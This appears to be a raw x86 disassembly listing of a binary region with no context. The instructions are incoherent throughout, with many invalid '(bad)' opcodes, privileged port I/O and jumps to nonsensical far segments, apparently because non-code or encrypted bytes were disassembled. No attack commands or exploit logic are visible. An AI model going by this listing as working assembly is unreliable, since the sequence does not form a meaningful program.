  4074e0:	xchg   BYTE PTR [eax],bh
  4074e2:	jle    0x40752a
  4074e4:	pop    ecx
  4074e5:	jmp    0x40754e
  4074e7:	sub    BYTE PTR cs:[ebx+0x31619e5d],ah
  4074ee:	idiv   BYTE PTR [esi]
  4074f0:	cmp    al,0x35
  4074f2:	fs (bad) 
  4074f4:	and    BYTE PTR [eax+0x7383c2e5],dl
  4074fa:	ins    BYTE PTR es:[edi],dx
  4074fb:	shl    DWORD PTR [ecx-0x9fc80cb],0x9a
  407502:	ror    DWORD PTR [esi-0x5b],0xa9
  407506:	jp     0x40755c
  407508:	xchg   BYTE PTR [ebp-0x1adb50ca],bh
  40750e:	mov    esi,0x60c8bd60
  407513:	scas   al,BYTE PTR es:[edi]
  407514:	dec    ebx
  407515:	push   esp
  407516:	push   eax
  407517:	stc    
  407518:	je     0x40752d
  40751a:	or     DWORD PTR [esi],ebx
  40751c:	sub    eax,0x15e6fdc6
  407521:	inc    ebp
  407522:	mov    esp,0x75d3a6b0
  407527:	call   0xa06a:0xc236330f
  40752e:	jb     0x40750e
  407530:	pop    es
  407531:	add    eax,0x8437fa74
  407536:	out    0x6,al
  407538:	mov    ecx,0xdf631013
  40753d:	or     eax,DWORD PTR [eax-0x2c]
  407540:	mov    BYTE PTR [esi],cl
  407542:	inc    esp
  407543:	jne    0x407540
  407545:	(bad)  
  407546:	loope  0x407560
  407548:	mov    cl,0x8a
  40754a:	jle    0x407570
  40754c:	jle    0x40755a
  40754e:	shl    BYTE PTR [edi+0x6a],1
  407551:	lock xor ecx,DWORD PTR [ebx+0x58]
  407555:	dec    edx
  407556:	add    edx,DWORD PTR [edx]
  407558:	jmp    0x23df:0x41ebf493
  40755f:	shl    DWORD PTR [ecx-0x799cf595],cl
  407565:	lds    ecx,FWORD PTR [ebx+0x52]
  407568:	or     BYTE PTR [edx+eiz*8],0xc1
  40756c:	call   0x70ff071c
  407571:	pop    ss
  407572:	retf   
  407573:	ds or  eax,0x40fa914e
  407579:	arpl   WORD PTR [eax-0x4],bp
  40757c:	mov    cl,bh
  40757e:	rcl    BYTE PTR [eax+0x78c341e1],1
  407584:	in     al,dx
  407585:	pop    edx
  407586:	into   
  407587:	sbb    BYTE PTR [ebp+0x2bc83cb4],bh
  40758d:	test   al,0x98
  40758f:	cmp    al,0xf3
  407591:	(bad)
  407595:	imul   esp,DWORD PTR [ebp-0x52],0x46
  407599:	ret    0xa202
  40759c:	pop    ecx
  40759d:	stc    
  40759e:	jecxz  0x407530
  4075a0:	jmp    0x41efd958
  4075a5:	popf   
  4075a6:	jge    0x407579
  4075a8:	jecxz  0x407575
  4075aa:	xor    ebp,0x324d10f7
  4075b0:	call   0xced9:0x799224c1
  4075b7:	mov    ebp,0x7123630e
  4075bc:	lea    edx,[ebp-0x53]
  4075bf:	shl    BYTE PTR [edi],1
  4075c1:	inc    edx
  4075c2:	ja     0x407602
  4075c4:	or     al,0x7d
  4075c6:	push   ds
  4075c7:	sub    ah,ah
  4075c9:	dec    edx
  4075ca:	inc    edx
  4075cb:	mov    ebp,0x67d5e319
  4075d0:	fcomp  DWORD PTR [ecx]
  4075d2:	push   ebx
  4075d3:	movzx  ebp,cl
  4075d6:	dec    ebp
  4075d7:	int3   
  4075d8:	popa   
  4075d9:	jns    0x407645
  4075db:	sub    DWORD PTR [esi],esi
  4075dd:	sub    BYTE PTR [esi-0x3a],al
  4075e0:	out    0xb5,al
  4075e2:	xor    eax,0x8746d755
  4075e7:	jmp    0x4075ff
  4075e9:	test   al,0xdc
  4075eb:	jecxz  0x4075d5
  4075ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075ee:	cli    
  4075ef:	sahf   
  4075f0:	xchg   ebx,eax
  4075f1:	repz push ss
  4075f3:	mov    eax,0xa7c13cc0
  4075f8:	(bad)  
  4075f9:	retf   
  4075fa:	inc    ebp
  4075fb:	das    
  4075fc:	sbb    eax,0xb8a66e0c
  407601:	arpl   bx,ax
  407603:	jmp    0xc98649d1
  407608:	ror    DWORD PTR [ecx],0x4c
  40760b:	push   0xbf37a55c
  407610:	xchg   edx,eax
  407611:	jge    0x4075d7
  407613:	pushf  
  407614:	cld    
  407615:	test   eax,0xde8d1740
  40761a:	and    DWORD PTR [esi+0x3ceb9c61],esp
  407620:	dec    BYTE PTR es:[eax]
  407623:	sub    BYTE PTR [eax+edi*8-0x3442118e],bl
  40762a:	pop    ebx
  40762b:	idiv   al
  40762d:	out    0x47,al
  40762f:	mov    ebx,0xb1170437
  407634:	lods   al,BYTE PTR ds:[esi]
  407635:	nop
  407636:	dec    ebx
  407637:	das    
  407638:	dec    ecx
  407639:	(bad)  
  40763a:	pop    esi
  40763b:	jnp    0x407628
  40763d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40763e:	arpl   WORD PTR ds:0xccd3eaa8,bp
  407644:	xlat   BYTE PTR ds:[ebx]
  407645:	or     esi,DWORD PTR fs:[edx+0x51dd65c8]
  40764c:	add    al,0x4f
  40764e:	(bad)  
  40764f:	loope  0x4075fe
  407651:	shl    DWORD PTR [edi-0x3b93bca1],1
  407657:	hlt    
  407658:	mov    ebp,edx
  40765a:	push   0xffffff8b
  40765c:	fcomip st,st(3)
  40765e:	cmp    BYTE PTR [ebx+ebp*1],dl
  407661:	je     0x40766e
  407663:	shl    DWORD PTR [edi-0x7],0xba
  407667:	sbb    edx,DWORD PTR [esi-0x4c52676]
  40766d:	push   ss
  40766e:	inc    esi
  40766f:	(bad)  
  407671:	jnp    0x4076f0
  407673:	retf   
  407674:	sbb    eax,0x464c5ee4
  407679:	dec    esp
  40767a:	sbb    al,0x2e
  40767c:	jns    0x4076d4
  40767e:	dec    edi
  40767f:	out    0x19,al
  407681:	or     BYTE PTR [esi-0x4693b021],dh
  407687:	xor    eax,ebp
  407689:	jge    0x40763f
  40768b:	clc    
  40768c:	or     DWORD PTR [esi+0x61],edi
  40768f:	loopne 0x4076d4
  407691:	cs pusha 
  407693:	adc    al,0x49
  407695:	sub    eax,0xf6d5ad8a
  40769a:	jae    0x40761d
  40769c:	jbe    0x4076b0
  40769e:	(bad)  
  4076a0:	sub    al,0xf2
  4076a2:	(bad)  
  4076a3:	call   0xb018:0x1574966f
  4076aa:	outs   dx,DWORD PTR ds:[esi]
  4076ab:	mov    al,ds:0xe0b5b86d
  4076b0:	fnstcw WORD PTR [ebp-0x2]
  4076b3:	push   ds
  4076b4:	pop    esi
  4076b5:	jnp    0x407653
  4076b7:	imul   edx,eax,0x3d
  4076ba:	je     0x407658
  4076bc:	into   
  4076bd:	or     ebp,DWORD PTR [eax*8+0x59ccea19]
  4076c4:	inc    edi
  4076c5:	inc    esi
  4076c6:	and    bh,BYTE PTR [edx+0x4d]
  4076c9:	retf   0x5eb5
  4076cc:	test   BYTE PTR ds:[ebx],dh
  4076cf:	dec    esi
  4076d0:	and    dl,BYTE PTR [edi]
  4076d2:	adc    al,0x52
  4076d4:	sti    
  4076d5:	adc    ecx,ebx
  4076d7:	or     ebx,DWORD PTR [eax-0x1d]
  4076da:	push   esi
  4076db:	in     al,dx
  4076dc:	mov    esp,0xccf35fc0
  4076e1:	test   eax,0xffde05de
  4076e6:	xchg   BYTE PTR [ecx],ah
  4076e8:	scas   eax,DWORD PTR es:[edi]
  4076e9:	lds    esp,FWORD PTR ds:0x76a9fdca
  4076ef:	jl     0x4076a0
  4076f1:	cmc    
  4076f2:	push   ss
  4076f3:	cmp    eax,0xdf6b92da
  4076f8:	pusha  
  4076f9:	add    al,0x1d
  4076fb:	addr16 in eax,0x27
  4076fe:	xchg   esp,eax
  4076ff:	call   0x435eea21
  407704:	cs in  eax,dx
  407706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407707:	pop    eax
  407708:	pop    eax
  407709:	stos   BYTE PTR es:[edi],al
  40770a:	pushf  
  40770b:	rdtsc  
  40770d:	sub    al,0x1c
  40770f:	lds    ecx,FWORD PTR [ecx+0x54c9e16d]
  407715:	mov    eax,ds:0x97ca5c35
  40771a:	pop    ss
  40771b:	aaa    
  40771c:	sti    
  40771d:	imul   edx,DWORD PTR [esi],0x55
  407720:	jmp    0x4076dc
  407722:	sub    DWORD PTR [ebx-0x11525ccb],0x1d
  407729:	adc    eax,0xa68a65ab
  40772e:	std    
  40772f:	pop    ebp
  407730:	dec    esp
  407731:	jbe    0x40779a
  407733:	mov    esi,0xa387bff5
  407738:	pop    ecx
  407739:	cmp    BYTE PTR [ecx-0x37d3a118],ah
  40773f:	in     eax,dx
  407740:	dec    esi
  407741:	pop    edi
  407742:	adc    DWORD PTR [ebx],edi
  407744:	daa    
  407745:	int3   
  407746:	sbb    bh,BYTE PTR [ecx+0x36]
  407749:	ror    DWORD PTR [ebx+0x647b387e],cl
  40774f:	mov    al,ds:0x1d8fc472
  407754:	les    edx,FWORD PTR [edx+edx*4+0x76b1c99e]
  40775b:	test   eax,0x23c192de
  407760:	imul   edi,ecx,0xc9397821
  407766:	bnd jns 0x407769
  407769:	sub    BYTE PTR [edi-0x71],0xff
  40776d:	mov    ch,0xfd
  40776f:	sti    
  407770:	(bad)  
  407771:	fld    TBYTE PTR [ebp+0x22]
  407774:	(bad)  
  407775:	loopne 0x4077e3
  407777:	xchg   ebp,eax
  407778:	sbb    edi,esp
  40777a:	dec    esp
  40777b:	das    
  40777c:	dec    edi
  40777d:	adc    DWORD PTR [eax+0x6c9ae1fe],ebx
  407783:	xor    edi,0x31
  407786:	sbb    eax,DWORD PTR [eax-0x5bbd1f8c]
  40778c:	leave  
  40778d:	mov    ebp,0xfc831d91
  407792:	scas   eax,DWORD PTR es:[edi]
  407793:	or     edx,esi
  407795:	sbb    BYTE PTR [edi-0x5f],0xa
  407799:	push   ebp
  40779a:	sub    DWORD PTR [edx],esp
  40779c:	jae    0x4077b6
  40779e:	shl    DWORD PTR [ebx],1
  4077a0:	pop    esp
  4077a1:	lods   eax,DWORD PTR ds:[esi]
  4077a2:	nop
  4077a3:	and    eax,0x4e62625e
  4077a8:	and    DWORD PTR [edi],edx
  4077aa:	fcomp  QWORD PTR [edx]
  4077ac:	je     0x407794
  4077ae:	hlt    
  4077af:	repnz sub al,0x8
  4077b2:	test   ch,ah
  4077b4:	nop
  4077b5:	jno    0x40780d
  4077b7:	ror    BYTE PTR [eax+0x1c],1
  4077ba:	push   edx
  4077bb:	adc    al,0x7b
  4077bd:	popf   
  4077be:	call   0xcbe1dd54
  4077c3:	add    eax,edi
  4077c5:	jno    0x40777c
  4077c7:	out    0xbf,al
  4077c9:	stos   DWORD PTR es:[edi],eax
  4077ca:	push   0xfa21fc55
  4077cf:	inc    eax
  4077d0:	xchg   edi,eax
  4077d1:	jle    0x4077af
  4077d3:	mov    edx,0xc6d1990a
  4077d8:	xchg   ebx,eax
  4077d9:	dec    ecx
  4077da:	outs   dx,BYTE PTR ds:[esi]
  4077db:	cmc    
  4077dc:	or     bh,BYTE PTR [ecx+0x45]
  4077df:	pop    es
  4077e0:	imul   esp,DWORD PTR [ebx],0x7d
  4077e3:	rcr    BYTE PTR [ebp-0x775d1f72],cl
  4077e9:	push   ss
  4077ea:	test   eax,0xda7d84d
  4077ef:	popf   
  4077f0:	inc    eax
  4077f1:	and    BYTE PTR [eax+ebx*1],ah
  4077f4:	stc    
  4077f5:	test   eax,0x50af2e15
  4077fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077fb:	cmp    eax,DWORD PTR ds:0x9df11904
  407801:	out    dx,al
  407802:	dec    esp
  407803:	cdq    
  407804:	ret    0x53ef
  407807:	pusha  
  407808:	ror    BYTE PTR [edx-0x72353a40],1
  40780e:	jnp    0x4077ff
  407810:	stos   BYTE PTR es:[edi],al
  407811:	retf   0xef1e
  407814:	out    dx,eax
  407815:	mov    ds:0xdc57c1d7,al
  40781a:	rcl    dh,cl
  40781c:	shl    BYTE PTR [ebx],1
  40781e:	adc    ecx,ecx
  407820:	repnz xor ah,BYTE PTR [ebp+0xd18ceee]
  407827:	loope  0x40784d
  407829:	hlt    
  40782a:	fcmovne st,st(1)
  40782c:	ins    DWORD PTR es:[edi],dx
  40782d:	xlat   BYTE PTR ds:[ebx]
  40782e:	(bad)  
  40782f:	call   0x4af3f061
  407834:	test   al,0x4f
  407836:	test   DWORD PTR [ebx+0x36],ebx
  407839:	mov    ds:0xa8428fbe,al
  40783e:	or     eax,0xa3aed968
  407843:	mov    WORD PTR [edx+0x6b26c94],fs
  407849:	shl    BYTE PTR [edi],1
  40784b:	bts    DWORD PTR [eax+0x4c],edi
  40784f:	inc    esp
  407850:	jecxz  0x4078c9
  407852:	(bad)  
  407853:	and    BYTE PTR [edi+0x3b4c9684],bh
  407859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40785a:	add    ch,ah
  40785c:	cwde   
  40785d:	pop    edx
  40785e:	pop    esi
  40785f:	sahf   
  407860:	sub    al,0x1c
  407862:	add    cl,ah
  407864:	mov    bh,0x1b
  407866:	sub    cl,BYTE PTR [eax-0xb6cb487]
  40786c:	repnz xchg ecx,eax
  40786e:	es rol BYTE PTR gs:[ebp-0x2471fa81],1
  407876:	in     eax,dx
  407877:	add    ebp,DWORD PTR [ecx-0x5308fbe3]
  40787d:	or     BYTE PTR [edx],al
  40787f:	inc    ebx
  407880:	ret    
  407881:	ins    DWORD PTR es:[edi],dx
  407882:	pop    edi
  407883:	cmp    bl,al
  407885:	or     eax,0x6b95ba28
  40788a:	add    dl,ah
  40788c:	push   esp
  40788d:	adc    cl,BYTE PTR [ebx+0x3eeb932a]
  407893:	imul   esp,ecx,0x63797fc0
  407899:	imul   edi,edi,0x4d96e316
  40789f:	(bad)  
  4078a1:	mov    esp,DWORD PTR [ecx+0x39]
  4078a4:	mov    ebx,0x9c8c4003
  4078a9:	adc    BYTE PTR [edx],dh
  4078ab:	jg     0x4078df
  4078ad:	mov    edi,0xf9d233a2
  4078b2:	mov    cl,0x58
  4078b4:	push   ebp
  4078b5:	not    dl
  4078b7:	add    BYTE PTR ds:0xbd928330,dh
  4078bd:	fistp  WORD PTR [ecx+ebx*4+0x32a09424]
  4078c4:	outs   dx,BYTE PTR ds:[esi]
  4078c5:	mov    ch,0xc4
  4078c7:	pusha  
  4078c8:	push   ebp
  4078c9:	lods   eax,DWORD PTR ds:[esi]
  4078ca:	stc    
  4078cb:	jns    0x407903
  4078cd:	pusha  
  4078ce:	xchg   edi,eax
  4078cf:	iret   
  4078d0:	dec    ebp
  4078d1:	push   ss
  4078d2:	mov    dh,0xf5
  4078d4:	sub    BYTE PTR [eax+0x2a],cl
  4078d7:	push   esp
  4078d8:	pop    edx
  4078d9:	mov    esp,0x87dfff1e
  4078de:	retf   0x1cee
  4078e1:	mov    edi,0x8caa7692
  4078e6:	cwde   
  4078e7:	push   esi
  4078e8:	outs   dx,DWORD PTR ds:[esi]
  4078e9:	dec    edx
  4078ea:	cs pop ecx
  4078ec:	dec    eax
  4078ed:	aam    0x99
  4078ef:	adc    BYTE PTR [esi-0x34ae99c8],dl
  4078f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078f6:	pop    ebx
  4078f7:	pop    edx
  4078f8:	sub    dl,BYTE PTR [ebx-0x38]
  4078fb:	data16 mov ch,0xc9
  4078fe:	sbb    BYTE PTR [eax-0x7f],ch
  407901:	adc    cl,BYTE PTR [edx-0x33]
  407904:	jnp    0x4078ad
  407906:	and    al,dl
  407908:	enter  0x45,0xdd
  40790c:	rol    BYTE PTR [edi-0x60ae4409],cl
  407912:	jbe    0x4078e6
  407914:	lea    ebp,[edi]
  407916:	es jp  0x407992
  407919:	pop    esp
  40791a:	adc    ecx,DWORD PTR [esi+0x708f512f]
  407920:	dec    esi
  407921:	(bad)  
  407923:	adc    BYTE PTR ds:[edx+edi*2-0x41240517],dl
  40792b:	mov    eax,ds:0x80bded00
  407930:	test   DWORD PTR [esi],ecx
  407932:	fst    DWORD PTR [eax-0x34]
  407935:	lds    ebp,FWORD PTR [edx+0x70]
  407938:	mov    eax,0xa5e914b6
  40793d:	retf   
  40793e:	leave  
  40793f:	enter  0x15ae,0xe
  407943:	les    edi,FWORD PTR [edx]
  407945:	xor    DWORD PTR [ecx],esi
  407947:	in     eax,dx
  407948:	test   DWORD PTR [ebp+0x48],esp
  40794b:	pop    es
  40794c:	sub    dh,bh
  40794e:	and    dl,BYTE PTR [edx+0x62]
  407951:	push   ecx
  407952:	out    dx,eax
  407953:	loop   0x4079be
  407955:	rcl    esi,cl
  407957:	jne    0x407924
  407959:	(bad)  
  40795a:	ficom  DWORD PTR [ecx-0x6f]
  40795d:	xchg   ebp,eax
  40795e:	push   ds
  40795f:	ret    0xa5b0
  407962:	inc    ecx
  407963:	int3   
  407964:	cmp    BYTE PTR [esi+0x0],0x63
  407968:	push   ebx
  407969:	or     DWORD PTR [edi+0x7c],ecx
  40796c:	push   ss
  40796d:	lahf   
  40796e:	int3   
  40796f:	retf   0x6050
  407972:	aaa    
  407973:	in     al,dx
  407974:	push   ebp
  407975:	fdivr  DWORD PTR [edi]
  407977:	dec    edi
  407978:	sti    
  407979:	pushf  
  40797a:	and    BYTE PTR [ecx-0x3c4feb25],bl
  407980:	aad    0xa4
  407982:	push   cs
  407983:	mov    dh,0x2a
  407985:	dec    esi
  407986:	cmp    bh,dh
  407988:	mov    edi,0xeac964e8
  40798d:	sbb    eax,0x75e80e36
  407992:	mov    dh,0x71
  407994:	pop    eax
  407995:	rcl    BYTE PTR [ebp-0x6dc83e8c],0x50
  40799c:	aaa    
  40799d:	inc    ecx
  40799e:	repnz push 0xffffffe3
  4079a1:	jg     0x40795f
  4079a3:	sub    eax,0xae0b8e56
  4079a8:	imul   BYTE PTR [eax+0x5e]
  4079ab:	jl     0x407956
  4079ad:	pop    eax
  4079ae:	sub    BYTE PTR [edx],0xc3
  4079b1:	sar    BYTE PTR [ebx-0x261dff42],cl
  4079b7:	jecxz  0x407a28
  4079b9:	ja     0x407987
  4079bb:	mov    bh,0xd4
  4079bd:	and    eax,0x3461c4f5
  4079c2:	nop
  4079c3:	dec    ecx
  4079c4:	push   esi
  4079c5:	popf   
  4079c6:	push   0xffffff98
  4079c8:	jecxz  0x4079e3
  4079ca:	jmp    0x407a32
  4079cc:	dec    edi
  4079cd:	xchg   esi,eax
  4079ce:	out    0xad,al
  4079d0:	out    dx,al
  4079d1:	pop    esi
  4079d2:	mov    edi,0x87c8f994
  4079d7:	push   eax
  4079d8:	fdivr  QWORD PTR ds:0xdc8a90a5
  4079de:	leave  
  4079df:	jp     0x407998
  4079e1:	xor    bl,BYTE PTR [edi]
  4079e3:	dec    ebx
  4079e4:	and    BYTE PTR [ebp+0x43d0a5b6],dh
  4079ea:	add    DWORD PTR [ebx+0x1f],edi
  4079ed:	scas   al,BYTE PTR es:[edi]
  4079ee:	mov    bh,0x17
  4079f0:	outs   dx,BYTE PTR ds:[esi]
  4079f1:	or     al,0x21
  4079f3:	fiadd  WORD PTR [ebp-0x53]
  4079f6:	pop    ds
  4079f7:	(bad)  
  4079f8:	cmp    DWORD PTR [edx+0x29],eax
  4079fb:	inc    edi
  4079fc:	fmul   DWORD PTR [ebx+0xb487f35]
  407a02:	or     al,0xa3
  407a04:	bound  esp,QWORD PTR [ebp-0x2f]
  407a07:	fwait
  407a08:	xchg   edi,eax
  407a09:	in     al,0x86
  407a0b:	stos   DWORD PTR es:[edi],eax
  407a0c:	cdq    
  407a0d:	pop    ecx
  407a0e:	mov    ch,0x3e
  407a10:	and    BYTE PTR [eax+0x1a47f3ed],0x5c
  407a17:	mov    ecx,0xac4e725d
  407a1c:	xor    bl,dl
  407a1e:	loop   0x4079d3
  407a20:	je     0x407a19
  407a22:	jb     0x407a8f
  407a24:	nop
  407a25:	and    ah,dh
  407a27:	fmul   QWORD PTR [eax]
  407a29:	test   DWORD PTR [edx+0x3f],0xb497795b
  407a30:	retf   0x727f
  407a33:	dec    ecx
  407a34:	mov    ecx,0x31fd1d8
  407a39:	cld    
  407a3a:	pop    edx
  407a3b:	jg     0x407aa4
  407a3d:	push   edx
  407a3e:	hlt    
  407a3f:	jecxz  0x407a30
  407a41:	aad    0xff
  407a43:	xchg   DWORD PTR [esi],ebp
  407a45:	imul   ecx,DWORD PTR [edx-0x60],0xf52e58fe
  407a4c:	dec    eax
  407a4d:	jp     0x407ac0
  407a4f:	data16 xor BYTE PTR [eax+esi*1-0x5],al
  407a54:	pop    ds
  407a55:	and    bl,dl
  407a57:	cwde   
  407a58:	imul   eax,ebp,0x42
  407a5b:	inc    esp
  407a5c:	pop    ds
  407a5d:	mov    edi,0xb05c9b3a
  407a62:	adc    eax,0x8e29c051
  407a67:	out    dx,eax
  407a68:	bound  ebx,QWORD PTR [edi]
  407a6a:	into   
  407a6b:	jns    0x407a10
  407a6d:	add    DWORD PTR [esp+eax*1+0x15008e49],esp
  407a74:	fstp   TBYTE PTR [ebx]
  407a76:	jo     0x407ad9
  407a78:	leave  
  407a79:	ret    0xe3c9
  407a7c:	push   0x2d
  407a7e:	stc    
  407a7f:	out    dx,eax
  407a80:	adc    al,0x49
  407a82:	push   0x67
  407a84:	xchg   ebx,eax
  407a85:	adc    al,0x9a
  407a87:	neg    al
  407a89:	in     al,dx
  407a8a:	adc    eax,DWORD PTR [ebx-0x70759cb6]
  407a90:	jne    0x407ac2
  407a92:	stos   DWORD PTR es:[edi],eax
  407a93:	add    esp,DWORD PTR [esi]
  407a95:	cmp    edi,esp
  407a97:	test   cl,bh
  407a99:	shl    DWORD PTR ds:0x47b8907f,1
  407a9f:	out    dx,eax
  407aa0:	push   ss
  407aa1:	xor    al,0x35
  407aa3:	and    eax,edx
  407aa5:	sbb    DWORD PTR [edi-0x2cb012d7],edx
  407aab:	xor    al,BYTE PTR [ecx+0x3f]
  407aae:	inc    eax
  407aaf:	jbe    0x407a72
  407ab1:	fs in  al,0x2e
  407ab4:	mov    esp,0x7cc81011
  407ab9:	pop    ds
  407aba:	not    BYTE PTR [edx+0x31]
  407abd:	xchg   edi,eax
  407abe:	mov    ebp,0x85093733
  407ac3:	and    eax,0xd2fc6696
  407ac8:	es xchg esi,eax
  407aca:	xchg   ebx,eax
  407acb:	add    DWORD PTR [ebx-0x771b5d2e],edx
  407ad1:	cmp    al,0xa9
  407ad3:	mov    ecx,0xd9fc65b1
  407ad8:	push   cs
  407ad9:	mov    edx,DWORD PTR [ecx+0x5]
  407adc:	cmc    
  407add:	(bad)  
  407ade:	je     0x407a72
  407ae0:	adc    ch,BYTE PTR [ebx+0x53ccc498]
  407ae6:	ret    0x8439
  407ae9:	aam    0x97
  407aeb:	aam    0x2b
  407aed:	(bad)  
  407aee:	jns    0x407abc
  407af0:	jae    0x407b44
  407af2:	adc    esi,DWORD PTR ds:0xbc4ea98e
  407af8:	ins    BYTE PTR es:[edi],dx
  407af9:	inc    eax
  407afa:	test   BYTE PTR [ecx+0xe0d368],cl
  407b00:	bt     eax,eax
  407b03:	push   edx
  407b04:	xor    eax,0xc2ebd309
  407b09:	dec    edx
  407b0a:	push   0xffffffc2
  407b0c:	fldcw  WORD PTR [eax+0x2d]
  407b0f:	sub    BYTE PTR [ecx],0x4e
  407b12:	cwde   
  407b13:	rol    DWORD PTR [edx-0x22e7c656],0x5
  407b1a:	repz push edi
  407b1c:	mov    eax,0xdb0edf
  407b21:	or     al,0xb2
  407b23:	(bad)  
  407b24:	cwde   
  407b25:	repnz push cs
  407b27:	rcl    BYTE PTR [ebx-0x46],cl
  407b2a:	adc    bh,BYTE PTR ds:0xde777b0b
  407b30:	or     eax,0xcb8feca6
  407b35:	inc    edx
  407b36:	sahf   
  407b37:	and    DWORD PTR [edx],ecx
  407b39:	(bad)  
  407b3a:	in     eax,dx
  407b3b:	shl    al,1
  407b3d:	or     dl,dl
  407b3f:	mov    edi,0x95e1f0bf
  407b44:	pop    ds
  407b45:	push   esp
  407b46:	mov    bl,BYTE PTR [ebx+0x55ae5134]
  407b4c:	jbe    0x407b7f
  407b4e:	inc    ebx
  407b4f:	cmp    al,0x5e
  407b51:	inc    ecx
  407b52:	int3   
  407b53:	in     eax,dx
  407b54:	cmp    DWORD PTR [edi-0x7191919b],esi
  407b5a:	mov    ah,0x8c
  407b5c:	adc    al,0xe6
  407b5e:	xor    eax,eax
  407b60:	dec    edi
  407b61:	in     eax,0x98
  407b63:	cmp    dh,BYTE PTR [esi]
  407b65:	addr16 jbe 0x407bd3
  407b68:	cdq    
  407b69:	xchg   edx,eax
  407b6a:	(bad)  [ebp+0x1f7f5e9f]
  407b70:	pop    es
  407b71:	das    
  407b72:	add    DWORD PTR [ebp-0x4d],ebp
  407b75:	push   0x77a303e8
  407b7a:	fst    DWORD PTR [edx-0x2ba4241f]
  407b80:	inc    eax
  407b81:	iret   
  407b82:	xor    BYTE PTR [ebp+esi*2-0x1eee79da],0xb6
  407b8a:	jge    0x407b65
  407b8c:	cli    
  407b8d:	mov    ebx,0xa9a92020
  407b92:	mov    ch,0xfc
  407b94:	jbe    0x407bfd
  407b96:	sbb    al,0x3f
  407b98:	push   es
  407b99:	xchg   esp,eax
  407b9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b9b:	push   edx
  407b9c:	and    BYTE PTR [eax+0x5b],0xfe
  407ba0:	pop    ebx
  407ba1:	mov    BYTE PTR [edi+ebx*2],0xb7
  407ba5:	pusha  
  407ba6:	aaa    
  407ba7:	push   ebp
  407ba8:	inc    eax
  407ba9:	arpl   WORD PTR [ebx+ebp*1],dx
  407bac:	inc    edi
  407bad:	loop   0x407b8e
  407baf:	ret    0x8fc6
  407bb2:	mov    DWORD PTR [edi-0x40],edx
  407bb5:	dec    edi
  407bb6:	xchg   esi,eax
  407bb7:	mov    bl,BYTE PTR [esi]
  407bb9:	not    dl
  407bbb:	jne    0x407c20
  407bbd:	mov    ds:0x1756c11f,al
  407bc2:	push   edx
  407bc3:	cmp    eax,DWORD PTR [eax-0x7a7e8f85]
  407bc9:	mov    eax,ds:0xb4bbb70b
  407bce:	fisub  DWORD PTR [eax-0x2f]
  407bd1:	test   al,0x72
  407bd3:	inc    edx
  407bd4:	push   cs
  407bd5:	aad    0x8a
  407bd7:	add    esp,ebx
  407bd9:	xor    edi,esp
  407bdb:	pushf  
  407bdc:	jo     0x407b83
  407bde:	dec    ecx
  407bdf:	sub    DWORD PTR [ebx-0x27fb77c0],esi
  407be5:	imul   esi,DWORD PTR [esi],0xd66e7227
  407beb:	mov    ds:0xc2e7b853,eax
  407bf0:	mov    ds:0x5b01f3d,al
  407bf5:	cmp    dl,BYTE PTR ds:0x834c9b40
  407bfb:	or     al,0x91
  407bfd:	and    eax,0xb837e5be
  407c02:	xchg   esp,eax
  407c03:	call   FWORD PTR ds:0xf76a0183
  407c09:	xchg   BYTE PTR [eax+eax*8+0x36],al
  407c0d:	scas   al,BYTE PTR es:[edi]
  407c0e:	and    DWORD PTR [edi+0x3f],ecx
  407c11:	popf   
  407c12:	cmp    BYTE PTR [esi+ecx*8-0x55],bl
  407c16:	mov    edx,0xdc8680da
  407c1b:	push   ebp
  407c1c:	inc    esi
  407c1d:	inc    esp
  407c1e:	cmp    al,0x7b
  407c20:	sbb    dl,ah
  407c22:	adc    BYTE PTR [edi-0x3],ch
  407c25:	pop    ebx
  407c26:	sub    BYTE PTR [ebx+esi*2-0x77e85e9a],ah
  407c2d:	sub    edx,0x44a019a1
  407c33:	dec    esi
  407c34:	xchg   ebx,eax
  407c35:	dec    eax
  407c36:	or     eax,0x61c606e9
  407c3b:	cmp    al,0x20
  407c3d:	xchg   esi,eax
  407c3e:	and    eax,0x35d60f21
  407c43:	mov    bl,0x87
  407c45:	xchg   DWORD PTR [edi+0x78],esp
  407c48:	xor    ah,BYTE PTR [esi+0x5e]
  407c4b:	mov    gs,WORD PTR [ebx+0x5e]
  407c4e:	jecxz  0x407c9f
  407c50:	inc    esp
  407c51:	ficom  WORD PTR [ebp+0x63a5d156]
  407c57:	sub    al,0xb
  407c59:	cmp    edi,edx
  407c5b:	mov    edx,0x8916e5cc
  407c60:	sub    eax,0x6d063b2b
  407c65:	add    eax,0xc95f6f06
  407c6a:	mov    eax,0xbbee8d90
  407c6f:	(bad)  
  407c70:	mov    ebx,0x916a4c4a
  407c75:	cmc    
  407c76:	fidivr DWORD PTR [edx-0xd9dc7e8]
  407c7c:	cmp    DWORD PTR [ebp-0x3a],ebp
  407c7f:	ret    0xd085
  407c82:	pushf  
  407c83:	movlps xmm1,QWORD PTR [esi+0x1d174e52]
  407c8a:	sbb    al,0xd3
  407c8c:	xor    ebx,DWORD PTR [ebp+0x53]
  407c8f:	xlat   BYTE PTR ds:[ebx]
  407c90:	addr16 pusha 
  407c92:	clc    
  407c93:	pop    esp
  407c94:	into   
  407c95:	inc    ebx
  407c96:	xchg   edx,ecx
  407c98:	or     ebx,DWORD PTR [ecx+0x70]
  407c9b:	ins    BYTE PTR es:[edi],dx
  407c9c:	sbb    al,0x0
  407c9e:	sub    al,BYTE PTR [edi+0x58]
  407ca1:	mov    al,ds:0x9956c6d1
  407ca6:	or     ch,0xe5
  407ca9:	xchg   ebp,eax
  407caa:	add    al,0x9f
  407cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cad:	push   ebp
  407cae:	retf   
  407caf:	out    0xf9,eax
  407cb1:	lea    edi,[esi-0x16]
  407cb4:	push   eax
  407cb5:	into   
  407cb6:	imul   ebp,ebx,0x7a
  407cb9:	es stos DWORD PTR es:[edi],eax
  407cbb:	(bad)
  407cbe:	(bad)  
  407cbf:	into   
  407cc0:	fwait
  407cc1:	xor    bl,BYTE PTR [ecx-0x717e9f88]
  407cc7:	loope  0x407d48
  407cc9:	add    DWORD PTR [ecx],edi
